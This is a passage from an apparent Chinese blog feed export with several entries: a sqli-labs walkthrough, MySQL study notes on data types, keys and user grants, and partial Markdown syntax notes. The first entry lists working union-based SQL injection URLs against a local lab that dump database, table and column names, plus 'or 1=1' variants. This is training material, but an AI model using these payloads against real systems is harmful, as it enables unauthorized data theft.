sql注入爆库表列</h1><p><code>条件PHP语句中能够执行的GET语句输出变量</code></p><h2 id="爆库操作实现"><a href="#爆库操作实现" class="headerlink" title="爆库操作实现"></a>爆库操作实现</h2><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./4.png" srcset="/img/loading.gif" alt=""> </p><h3 id="information-schema知识点补充："><a href="#information-schema知识点补充：" class="headerlink" title="information_schema知识点补充："></a>information_schema知识点补充：</h3><p>informaition_schema看作一个数据库，存储作用数据库的库信息<br>    SCHEMATA表：提供了当前mysql实例中所有数据库的信息。show databases的结果取之此表//所以information_schema 会在schemata中查询 <code>show schema_name from information_schema.schemata</code><br>    –TABLES表：提供了关于数据库中的<code>表信息</code>。<code>show table_name from information_schema.tables where table_schema=security</code><br>    –COLUMNS表：提供表中的 <code>列信息</code>. <code>show column_name from information_schema.columns where table_name=xxx</code></p><h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./5.png" srcset="/img/loading.gif" alt=""><br><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3% 20from%20information_schema.schemata--+</code></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./6.png" srcset="/img/loading.gif" alt=""><br><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20f rom%20information_schema.tables%20where%20table_schema=%27security%27--+</code></p><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%2 0from%20information_schema.columns%20where%20table_name=%27users%27--+</code><br><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./7.png" srcset="/img/loading.gif" alt=""> </p><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>id传入值为整数型，只需要 or 1=1 –+其他和less-1相同</p><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>构造 id=1’) or 1=1 –+</p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>构造 id=1”) or 1=1 –+</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql格式介绍</title>
    <link href="/2018/11/23/sql%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D/"/>
    <url>/2018/11/23/sql%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><ul><li>字符编码:计算机针对各种符号，在计算机中的一种二进制存储代号。</li><li>字符集：多个字符的集合<pre><code>ASCII GB2312 BIG5 B18030 UNICODE</code></pre></li></ul><p>如果直接通过CMD直接插入中文会出错<br>1、用户是通过mysql.exe 里啊操作 mysqld.exe<br>2、真正的SQL执行时是Mysqld.exe来执行<br>3、mysql.exe将数据传入mysqld.exes的时候，没有告知其对应的符号规则（字符集），而mysqld也没有能力自己判断，机会hi 用自己默认的（字符集）<br>    解决方案：mysql.exe客户端在进行数据操作之前将自己所使用的字符集告诉mysqld<br>    cmd下的mysql.exe默认只有一个字符集 GBK</p><p>MYsql.exe如果告知mysqld对应的字符类型为gbk<br>快捷方式：set names gbk;<br>深层原理：客户端，服务端，连接层（show variables like ‘character_set%’）<br>Mysql.exe 与 Mysqld.exe 之间的处理关系一共分为三层<br>客户端传入数据给服务端：client<br>服务端返回数据给客服端：server<br>客户端与腹短之间的连接：collection</p><p>Set names 字符集的本质：一次性打通三层字符集，达成一致<br>系统中由三个变量来记录这三个关系对应的字符集：show variables like ‘character_set%’<br>修改服务端变量的值</p><p>– 插入中文<br>    Insert into my_teacher values(‘张三’,12);<br>– mysql.exe告知mysqld.exe自己的字符集规则<br>    set names gbk;(直接这样)</p><p>– 查看系统保存的三种关系处理字符集<br>    show variables like ‘character_set%’;</p><p>– 修改变量<br>    set character_set_client = gbk; </p><h2 id="列类型（字段类型）"><a href="#列类型（字段类型）" class="headerlink" title="列类型（字段类型）"></a>列类型（字段类型）</h2><ul><li><p>整数类型</p></li><li><p>Tinyint<br>  迷你整型，系统采用一个字节来保存的整形，最大表示0~255；</p></li><li><p>Smallint<br>  小整型，系统采用两个字节来保存的整形，0~65535之间</p></li><li><p>Mediumint<br>  中整形,采用三个字节来保存数据。</p></li><li><p>Int<br>  整形（标准整型），采用四个字节来保存数据。</p></li><li><p>Bigint<br>  大整形，采用8个字节来保存数据<br>Tiniyint 和 Int使用比较普遍</p></li></ul><h2 id="无符号设定"><a href="#无符号设定" class="headerlink" title="无符号设定"></a>无符号设定</h2><p>无符号：表示存储的数据在当前字段中，没有负数（只有整数达到0~255）<br>基本语法;alter table my_int add 字段名  tinyint unsigned first;</p><p>插入最大数字会报错，是因为mysql默认的整形增加附属，实际表示的区间为-127~128;<br>– 创建数据表<br>    create table my_int(<br>    int_1 tinyint,<br>    int_2 smallint,<br>    int_3 mediumint,<br>    int_4 int,<br>    int_5 bigint<br>    )charset utf8;</p><p>– 插入数据<br>    Insert into my_int values(10,10000,100000,10000000,100000000000);<br>    Insert into my_int values(255,255,255,255,255);<br>    Insert into my_int values(-128,255,255,255,255);<br>    alter table my_int add int_6  tinyint unsigned first;</p><h2 id="列类型-显示长度"><a href="#列类型-显示长度" class="headerlink" title="列类型___显示长度"></a>列类型___显示长度</h2><p>显示长度：指数据在数据显示的时候，到底可以显示多少位。</p><p>Tinyint(3)；表示最长可以显示3位 ，unsigned 说明只能是整数，0-255用用不会超过三个长度<br>Tinyint(4):表示最长可以显示4位，-128-127.</p><ul><li><p>显示长度只是嗲表了数据是否可以达到指定的长度，但是不会自动满足到指定长度，如果像要数据显示的时候，保持最高位（显示长度），那么还需要增加一个zerofill属性才可以</p></li><li><p>zerofill:从左侧开始填充0（左侧不会改变数值大小），所以负数的时候不能时候zerofill。</p></li><li><p>数据显示的时候，zerofill会在左侧填充0到指定位，如果不足三位，填充到三位。本身已经够了或者超出，那么就不再填充。</p></li><li><p>显示长度可以自己设定，超出长度（但是不超出范围）不会影响，只会对不够长度的进行补充。</p></li></ul><h2 id="列类型————小数型"><a href="#列类型————小数型" class="headerlink" title="列类型————小数型"></a>列类型————小数型</h2><p>专门用来存储鸮属的<br>在Mysql中将小数分为两类：浮点型和定点型。<br>存储较大的值，利用存储数据的位来存储指数</p><ul><li><p>浮点型<br>  精度类型，有可能丢失精度类型的数据类型，数据可能不准确（尤其在超出精度长度范围）</p><ul><li><p>Float<br>  Float称为单精度类型，系统提供4个字节来存储数据，但是能表示的数据范围比整型大的多，约为10^38次方，只能保证大概7个左右的精度<br>  基本语法：</p><pre><code>Float：指定不现实小数位的浮点数Float(M,D):表示一共存储M个有效数字，其中效数部分占D位Float(10,2):整数8位，效数2位。</code></pre><p>1、创建一个数据表保存浮点数<br>2、存入数据<br>浮点数的英语：用处是用来保存一些数量特别大，达到可以不用那么精确的数据。</p></li><li><p>Double<br>  Double又称之为双精度，系统用8个字节来存储数据，10^308次方，精度15位左右</p></li><li><p>定点数</p><p>  定点数：能够保证数据精确的小数（效数部分可能不精确，超出长度会四舍五入），整数不放呢一定精确</p></li><li><p>Decimal<br>  Decimal定点数：系统自动根据存储的数据来分配存储空间，每大概九个数就会分配四个字节来存储，同时效数和整数部分是分开的。</p><p>  decimal(M,D):M表示总长度，最大值不能超过65，D代表小数部分的长度，最长不能超过30位。<br>  1、创建表：与浮点数对比</p></li></ul></li></ul><p>——————————————————————————————————————————————————————————————————————————————————————<br>    create table my_float(<br>        f1 float,<br>        f2 float(10,2)<br>    )charset utf8;<br>    insert into my_float values(123.123,12345678.90);<br>    //数据精度丢失，浮点型按四舍五入的方式进行<br>    insert into my_float values(123.1234567,123456789.00);</p><pre><code>insert into my_float values(13.1234567,99999999.99);//插入数据超过指定整数部分长度，但是如果是系统自动进位导致的insert into my_float values(123.123,10e5);//浮点数可采用课采用科学计数法来存储数据create table my_decimal(    f1 float(10,2),    d1 decimal(10,2))charset utf8;insert into my_decimal values(99999999.99,99999999.99);    insert into my_decimal values(99999999.99,99999999.999);//定点数四舍五入</code></pre><h2 id="时间日期类型"><a href="#时间日期类型" class="headerlink" title="时间日期类型"></a>时间日期类型</h2><ul><li><p>Date<br>  日期类型:系统使用三个字节来存储数据，对应的格式位：YYYY-mm-dd,能表示的范围从<br>  1000-01-01到9999-12-12，初始值为0000-00-00</p></li><li><p>Time<br>  时间类型：能够表示某个指定的时间，但是系统统一是提供3个字节来存储，对应的格式为<br>  HH:ii:ss，但是Time类型能够表示的时间范围要大的多</p></li><li><p>Datetime<br>  日期时间类型：就是将前面的date和time合并起来，表示的时间，使用8个字节存储<br>  格式为:YYYY-mm-dd HH:ii:ss,能表示的区间1000-01-01 00:00:00 到9999-12-31 23：59：59</p></li><li><p>Timestamp<br>  时间戳类型：mysql中的时间戳只是表示从格林威治依然和datetime.</p></li><li><p>Year<br>  年类型：占用一个字节来保存，能表示1900年到2155年，但是year两种数据插入方式：<br>  0~99和四位数的具体年</p><p>  year进行两位数插入的时候，有一个区间划分，69和70划分界限。<br>  timestamp当对应的数据被修改的阿时候，会自动更新（这个被修改的数据以是自己）</p></li></ul><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><ul><li>char<br>  基本类型：char(L),L代表字符数（中文与英文字母一致），L长度为0~255.</li><li>Varchar<br>边长字符：指定长度之后，系统会更具实际存储的数据来来计算长度，分配合适的长度（数据没有超出长度）。<br>基本语法：varchar(L)，L代表字符数，L的长度理论值0~65535<br>Varchar要记录数据长度（数据根据数据长度自动分配空间）</li></ul><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>___</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>fenge</p><pre><code>-- 创建对应的数据表create table my_date(    d1 date,    d2 time,    d3 datetime,    d4 timestamp,    d5 year)charset utf8;</code></pre><p>insert into my_date values(<br>    ‘1900-01-01’,’12:12:12’,’1900-01-01 12:12:12’,’1999-01-01 12:12:12’<br>    ,69<br>);</p><h2 id="列属性"><a href="#列属性" class="headerlink" title="列属性"></a>列属性</h2><p>NULL,默认值，列描叙，主键，唯一键和自动增长。<br>注意</p><ol><li>在设计表的时候，尽量不要让数据为空</li><li>记录长度为65535个字节</li></ol><ul><li>默认值<br>defaul:默认值，不进行数据插入会为其填充为null</li><li>列描述<br>comment 专门为开发人员进行维护的一个注释说明<br>基本语法：comment ‘字段描述’;<br>查看comment：查看表创建语句</li></ul><hr><p>– 创建数据表<br>create table my_default(<br>    name varchar(10) NOT NULL,<br>    age int default 18<br>)charset utf8;</p><p>– 创建表，增加字段描述<br>create table my_comment(<br>name varchar(10) not null comment ‘当前是用户名，不能为空’,<br>pass varchar(50) not null comment ‘密码不能为空’<br>)charset utf8;</p><p>————————————————————————————————————————————</p><h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><p>主要的键，primary key 有且只有一个字段，里面的值唯一性。</p><ul><li><p>创建主键</p></li><li><p>随表创建<br>系统提供两种增加主键的方式</p></li></ul><ol><li>方案1：直接在需要当作主键的字段之后，增加primary key确定主键</li><li>方案2：在所有字段之后增加主键选项，primary key（字段信息）</li></ol><ul><li><p>表后增加<br>基本语法：alter table 表名 add primary key(字段);</p></li><li><p>查看主键<br>方案1: 查看表结构<br>方案2：查看表的创建语句</p></li><li><p>删除主键<br>基本语法：alter table 表名 drop primary key;</p></li></ul><p>– 在字段后增加主键属性</p><ul><li><p>复合主键<br>案例：有一张学生选修课表，学生可以选秀多个选修课，一个选修课可以由多个学生来选，但是一个学生在一个选修课中只有一个选修课成绩。</p></li><li><p>主键约束<br>主键一旦增加，那么对对应的字段有数据要求</p></li></ul><ol><li>当前字段对应的数据不能为空。</li><li>当前字段对应的数据不能有任何重复</li></ol><p>create table my_pri1(<br>    username varchar(10) primary key<br>)charset utf8;</p><p>create table my_pri2<br>(<br>    username varchar(10),<br>    primary key(username)<br>)</p><p>create table my_pri3<br>(<br>    username varchar(10)<br>);<br>alter table my_pri3 add primary key(username);</p><p>aliter table my_pri3 drop primary key;</p><p>create table my_score(<br>    student_no char(10),<br>    course_no char(10),<br>    score tinyint not null,<br>    primary key(student_no,course_no)<br>)charset utf8;</p><p>insert into my_score values (‘00000001’,’course01’,100);<br>insert into my_score values (‘00000002’,’course02’,90);<br>insert into my_score values (‘00000001’,’course03’,95);</p><hr><h2 id="自动增长"><a href="#自动增长" class="headerlink" title="自动增长"></a>自动增长</h2><p>自动增长：auto_increment根据以前存在的数据进行自动增加<br>自动增长用于逻辑主键<br>原理：</p><ol><li>系统维护一组数据，用来保存当前使用了自动增长属性的字段，记住当前对应的数据值，在给定一个指定的步长。</li><li>当用户进行数据插入的时候，如果没有给定值，系统在原始值上再加上新的步长新的数据</li><li>自动增长的出发，给定属性的字段没有提供值</li><li>自动增长只适用于数值</li></ol><ul><li>使用自动增长<br>基本语法：在字段之后增加一个属性auto_increment.<br>插入数据：出发自动增长，不能给定一个值</li><li>修改自动增长</li></ul><ol><li>查看自增长，自增长一旦触发使用，会自动在表选项增加一个选项（一张表最多只能拥有一个自增长）</li></ol><ul><li>删除自动增长<br>删除自增长：就是在字段属性之后不再暴力auto_increment,当用户修改自增长所在的字段,如果没有看到auto_increment属性,系统会自动清楚该自增长</li><li>初始设置<br>在系统中，有一组变量用来维护自增长<br>show variables like ‘auto_increment%’;</li><li>细节问题</li></ul><ol><li>一张表只有一个自增长，自增长会上升到表选项中</li><li>如果数据插入中没有出发自增长（给定了数据），那么自增长不会表现</li><li>自增长修改的时候，值可以较大，但是不能比他小</li></ol><p>create table my_auto(<br>    id int primary key auto_increment,<br>    name varchar(10) not null comment ‘用户名’,<br>    pass varchar(50) not null comment ‘密码’<br>);</p><p>insert into my_auto values(null,’Tom’,’123456’);</p><p>– 修改auto_incrememnt<br>alter table my_auto auto_increment = 10;</p><p>– 删除自增长<br>alter table my_auto modify id int;<br>– 切记不要在再次增加primary key</p><p>– 查看自增长初始变量<br>show variables like ‘auto_increment%’;</p><p>– 增加自增长<br>alter table my_auto modify id int auto_increment;</p><p>insert into my_auto values(3,’Jack’,’123456’);</p><p>——————————————————————————————————————————————————————————————</p><h2 id="唯一键"><a href="#唯一键" class="headerlink" title="唯一键"></a>唯一键</h2><p>unique key,用来保证䫕的字段中的数据唯一<br>主键也而可以用来保证数据的唯一性，但是一张表只有一个主键。</p><ol><li>为一间在一张表中可以有多个</li><li>唯一键允许字段数据为NULL NULL可以有多个（NULL不参与比较）</li></ol><ul><li>创建唯一键<br>表字段之后鞥家唯一键标识符，unique[key]<br>2、 在所有的字段之后使用unique key[字段列表]</li></ul><ol start="3"><li>在创建表之后也可以增加唯一键<br>alter table 表名 add unique key[字段列表]</li></ol><pre><code> create table my_unique1(    id int primary key auto_increment,    username varchar(10) unique );        create table my_unique2(        id int primary key auto_increment,        username varchar(10),        unique key(username)    );create table my_unique3(    id int primary key auto_increment,    username varchar(10));alter table my_unique3 add unique key(username);</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库操作命令</title>
    <link href="/2018/11/21/sql/"/>
    <url>/2018/11/21/sql/</url>
    
    <content type="html"><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>!! 数据库是存储最外层</p><h2 id="创建数据库：基本语法"><a href="#创建数据库：基本语法" class="headerlink" title="创建数据库：基本语法"></a>创建数据库：基本语法</h2><pre><code>create database 数据库名字 [库选项];create database 数据库名字 charset 字符集名称</code></pre><ul><li>库选项：数据库相关属性</li><li>字符集：charset 代表当前数据库下的所有表存储的数据默认指定的字符集（默认DBMS）</li><li>校对集: collate</li></ul><h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><ul><li>每当用户通过SQL，系统会产生一个数据库<br>  （data目录下）</li><li>每个数据库文件下都有OPT文件，保存对应的数据库选项显示charset和collate<ul><li>mysql核心数据库：权限关系</li><li>performance_schema：效率库</li><li>test:测试：空库</li></ul></li></ul><h2 id="指令查看数据库："><a href="#指令查看数据库：" class="headerlink" title="指令查看数据库："></a>指令查看数据库：</h2><pre><code>显示全部：show databases;显示部分：show databases like &apos;匹配模式&apos;:</code></pre><ul><li>_:匹配当前位置单个字符</li><li>%:匹配指定位置多个字符</li><li>获取以my开头的全部数据库:’my%’;</li><li>获取m开头，后i按第一个字符不确定，最后为database的数据库:’m_database’;</li><li>获取以database结尾的数据库:’%database’</li></ul><h2 id="显示数据库创建语句"><a href="#显示数据库创建语句" class="headerlink" title="显示数据库创建语句:"></a>显示数据库创建语句:</h2><pre><code>基本语法：show create database 数据库名字;（显示的语句被系统加工过并未被修改）</code></pre><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><pre><code>基本语法：use 数据库名字;</code></pre><p>为什么要选择数据库？因为数据是存储到数据表，表存在数据库下，如果要操作数据，那么必须要进入到对应的数据库。</p><h2 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h2><pre><code>基本语法：alter database 数据库名字 charset=字符集;</code></pre><p>修改数据库字符集（库选项）：字符集和校对集<br>是否可以修改数据库名字？mysql5.5之前可以修改rename命令</p><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><pre><code>基本语法:drop database 数据库名字;</code></pre><p>删除虽简单，切记要做好安全操作，确保里面数据没有问题；<br>删除数据库之后，对应的文件夹也会删除，opt也会被删除</p><h2 id="普通创建表"><a href="#普通创建表" class="headerlink" title="普通创建表"></a>普通创建表</h2><pre><code>基本语法:create table 表面(字段名 字段类型 [字段属性],....)</code></pre><ol><li>在数据表名字前面加上数据名字,用”.”连接即可,数据库.数据表</li><li>在创建数据表之前先进入到某个具体的数据库即可,use 数据库名字<br>表选项:与数据库选项相类似<br>Engine:存储引擎,mysql提供的具体存储数据的方式,默认有一个innodb.<br>Charset:字符集,只有当签自己表有效(级别比数据库高)<br>Collate:校对集</li></ol><h2 id="复制已有表结构"><a href="#复制已有表结构" class="headerlink" title="复制已有表结构"></a>复制已有表结构</h2><pre><code>基本语法: create table 表名 like 表名://只要使用数据库.表名,就可以在任何数据库下访问其他数据库的表</code></pre><p>从已经存在的表复制一份(只复制结构,如果表中头数据不复制)</p><h2 id="显示数据表-多维度显示表"><a href="#显示数据表-多维度显示表" class="headerlink" title="显示数据表(多维度显示表)"></a>显示数据表(多维度显示表)</h2><pre><code>基本语法：show tables;基本语法：show tables like 数据表；(匹配显示表)基本语法：Describe 表名(Desc 表名;)        show columns from 表名;        （显示表结构：显示表中所包含的字段信息（名字，类型，属性））基本语法：show create table 表名;（显示表的创建语句：查看数据表创建时的语句，此鱼具看到的结构已经不是用户之前自己输入的）</code></pre><ul><li>mysql多种语句结束符<br>  ;与\g所表示的效果一样，都是字段在上排横着，下面跟对应的数据<br>  \G字段在左侧竖着，数据在右侧横着;</li><li>每一张数据表创建，那么就会在对应的数据库下创建一些文件</li><li>frm代表结构文件，结构文件来自于innodb存储引擎，innodb存储引擎所有的文件都存储在外部的ibdata   文件中(了解).</li></ul><h2 id="设置表属性"><a href="#设置表属性" class="headerlink" title="设置表属性"></a>设置表属性</h2><pre><code>表属性就是表选项，charset engine collate基本语法: alter table 表名 表选项【=】值;注意：如果数据库已经确定了，里面有很多数据了，不要轻易修改表选项（字符集影响不大）</code></pre><h2 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h2><p>修改表名：rename table 旧表名 to 新表名;<br>新增字段：alter table 表名 add [column] 新字段名 列类型 [类属性] [位置 first]<br>字段位置：字段想要存放的位置<br>        Frist:在某某之前（）第一个字段<br>        After 字段名：放在某个字段之后<br>修改字段名:alter table 表名 change 旧字段名 新字段名 字段类型 [列属性] 【新位置】<br>修改字段类型：alter table 表名 modify 字段名 新类型 【新属性】 【新位置】<br>删除字段：alter table 表名 drop 字段名;</p><h2 id="删除表结构"><a href="#删除表结构" class="headerlink" title="删除表结构"></a>删除表结构</h2><p>基本语法：drop table 表名[,表名2….];可以删除多个数据表<br>&lt;——————————————————————————–&gt;</p><pre><code>-- 创建数据库create DATABASE mydatabase;create database mydatabase charset gbk;show databases;-- 修改数据库选项alter database mydatabase charset gbk;-- 删除数据库drop database mydatabase;-- 创建数据表create table class(    -- 字段名 字段类型    -- 字段与表其实是分不开    -- 表必须放在对应的数据库下    name varchar(10) -- 10个字符(不能超过));-- 将数据表挂到数据库下create table mydatabase2.class(    name varchar(10));-- 进入数据库,创建表use mydatabase2;create table teacher(    name varchar(10));-- 使用表选项create table student (    name varchar (10)) charset utf8;-- 在test数据库下创建一个与teacher一样的表use test;create table teacher like mydatabase2.teacher;-- 查看所以表show tables;-- 显示表结构describe class;desc teacher;show columns from studet;-- 查看表创建语句show create table class;-- 修改表选项alter table student charset gbk;-- 数据库中数据名字通常由前缀，去数据库的前两个字符加上下划线rename table student to my_student;-- 给学生表增加age 字段alter table my_student add column age int;-- 增加字段：放到第一个字段alter table my_student add id int first;-- 修改字段名alter table my_student change age nj int;-- 修改字段类型alter table my_student modify name varchar(20);-- 删除字段alter table my_student drop nj;-- 删除表名drop table class;</code></pre><h2 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h2><p>本质含义，将数据以SQL的形式存储到指定的数据表（字段）<br>    Insert into 表名 [(字段列表)] values;<br>    Insert into 表名 values (对应表结构)//值列表必须与字段列表一致</p><h2 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h2><p>查询表中全部在数据：<br>    select * from 表名;<br>查询表中部分字段：<br>    select 字段列表 from 表名； //字段列表使用逗号隔开<br>简单条件查询数据：<br>    select 字段列表/* from 表名 where 字段名=值;</p><h2 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h2><pre><code>基本语法：delete from 表名 [where 条件]; //如果没有where条件，意味着系统会自动删除该表所有数据（慎用）</code></pre><h2 id="更新操作"><a href="#更新操作" class="headerlink" title="更新操作"></a>更新操作</h2><p>更新：将数据进行修改（通常是修改部分字段数据）<br>基本语法：updata 表名 set 字段名 = 新值 [where 条件]；//如果没有表中对应的那个字段都会被修改成统一值</p><pre><code>-- 插入数据到数据表create table my_teacher(    name varchar(10),    age int);insert into my_teacher (name,age) values(&apos;jack&apos;,30);-- 无指定字段列表（必须与设定的表结构一样）insert into my_teacher values(&apos;Lilei&apos;,28);-- 获取所有数据select * from my_teacher;-- 获取指定字段数据select name from my_teacher;-- 获取年龄为30岁人的名字select age from my_teacher where age = 30;-- 删除年龄为30随的老师delete from my_teacher where age = 30;</code></pre><h1 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h1><pre><code class="hljs sql">创建新用户：格式：<span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">on</span> 数据库.* <span class="hljs-keyword">to</span> 用户名@登录主机 <span class="hljs-keyword">identified</span> <span class="hljs-keyword">by</span> /<span class="hljs-string">"密码/"</span>创建新用户在Internet上连接：<span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">update</span>,<span class="hljs-keyword">delete</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> test1@/<span class="hljs-string">"%/"</span> <span class="hljs-keyword">Identified</span> <span class="hljs-keyword">by</span> /<span class="hljs-string">"abc/"</span>;创建新用户在本机上连接：<span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span>,<span class="hljs-keyword">insert</span>,<span class="hljs-keyword">update</span>,<span class="hljs-keyword">delete</span> <span class="hljs-keyword">on</span> mydb.* <span class="hljs-keyword">to</span> test2@localhost <span class="hljs-keyword">identified</span> <span class="hljs-keyword">by</span> /<span class="hljs-string">"abc/"</span>;</code></pre><h1 id="标准SQL匹配"><a href="#标准SQL匹配" class="headerlink" title="标准SQL匹配"></a>标准SQL匹配</h1><pre><code class="hljs erlang-repl">“_”匹配任何单个字符“<span class="hljs-comment">%”匹配任意数目字符</span></code></pre><p>匹配users表中的username列的以a开头的字段<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>匹配users表中的username列的以五个字符的的字段<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="标准正则表达式模式匹配"><a href="#标准正则表达式模式匹配" class="headerlink" title="标准正则表达式模式匹配"></a>标准正则表达式模式匹配</h2><pre><code>“.”匹配任何单个字符“[...]”匹配括号内的任何字符“[a-z]”匹配任何小写字母[0-9]匹配任何数字“*”匹配零个或多个在它前面的字符zA-Z]匹配任何小写和大写的字母“^”以某个字符开头“$”以某个字符结尾</code></pre><p>以a或A开头的字段<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>以n结尾的字段<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>模糊匹配五个字符<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="列的别名"><a href="#列的别名" class="headerlink" title="列的别名"></a>列的别名</h1><p>Select * from users where username=”Dummy”;<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="为列命名"><a href="#为列命名" class="headerlink" title="为列命名"></a>为列命名</h2><p>Select name as n,age as a from student order by n,a;<br>复制列字段到新的表<br>CREATE TABLE … SELECT<br>create table newusers select username as name,password as pwd from users;<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="表的别名"><a href="#表的别名" class="headerlink" title="表的别名"></a>表的别名</h1><p>Select * from users as uss where us.username=”admin”;<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="取出互不相同的记录"><a href="#取出互不相同的记录" class="headerlink" title="取出互不相同的记录"></a>取出互不相同的记录</h1><p>DISTINCT关键字<br>Select distinct …..</p><h1 id="全连接"><a href="#全连接" class="headerlink" title="全连接"></a>全连接</h1><p>select * from first,last where first.id=last.id;<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h1><p>Select * from first LEFT JOIN last ON first.id=last.id;<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>参考连接：<a href="https://blog.csdn.net/xycit/article/details/5854694" target="_blank" rel="noopener">https://blog.csdn.net/xycit/article/details/5854694</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown语法</title>
    <link href="/2018/11/06/Markdown%E5%B0%8F%E7%AC%94%E8%AE%B0/"/>
    <url>/2018/11/06/Markdown%E5%B0%8F%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown语法"><a href="#Markdown语法" class="headerlink" title="Markdown语法"></a>Markdown语法</h1><p>##标题<br>    # + 文字<br>    # 这是h1<br>    ## 这是 h2<br>    #### 这是h4</p><h2 id="区块引用-Blockquotes"><a href="#区块引用-Blockquotes" class="headerlink" title="区块引用 Blockquotes"></a>区块引用 Blockquotes</h2><pre><code>&gt;文字......</code></pre><blockquote><p>This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,<br>consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.<br>Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.</p><p>Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse<br>id sem consectetuer libero luctus adipiscing.</p></blockquote><blockquote><h2 id="这是一个标题。"><a href="#这是一个标题。" class="headerlink" title="这是一个标题。"></a>这是一个标题。</h2><ol><li>这是第一行列表项。</li><li>这是第二行列表项。</li></ol><p>给出一些例子代码：</p><pre><code>return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre></blockquote><hr><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><pre><code>*文字</code></pre><ul><li><p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.<br>Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,<br>viverra nec, fringilla in, laoreet vitae, risus.</p></li><li><p>Donec sit amet nisl. Aliquam semper ipsum sit amet velit.<br>Suspendisse id sem consectetuer libero luctus adipiscing.</p></li><li><p>A list item with a blockquote:</p><blockquote><p>This is a blockquote<br>inside a list item.</p></blockquote></li></ul><p>这是一个普通段乱：</p><pre><code>这是一个代码区块。    这是什么呢。asdasd&lt;div class=&quot;footer&quot;&gt;    &amp;copy; 2004 Foo Corporation&lt;/div&gt;</code></pre><p>形式<br>    1. 列表文字<br>    2. 列表而女子</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><pre><code>[连接名](连接)</code></pre><p>This is <a href="http://example.com/" target="_blank" rel="noopener" title="Title">an example</a> inline link.<br><a href="http://example.net/" target="_blank" rel="noopener">This link</a> has no title attribute.<br>[Google]: <a href="http://google.com/" target="_blank" rel="noopener">http://google.com/</a></p><hr><h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><p><em>、**、<em>、_</em><br>*强调</em><br><strong>强调</strong></p><hr><h2 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h2><ol><li>反引号<br> ``中加代码</li></ol><ul><li>Use the <code>printf()</code> function.</li><li><code>There is a literal backtick (`) here.</code></li><li>Please don’t use any <code>&lt;blink&gt;</code> tags</li></ul><ol 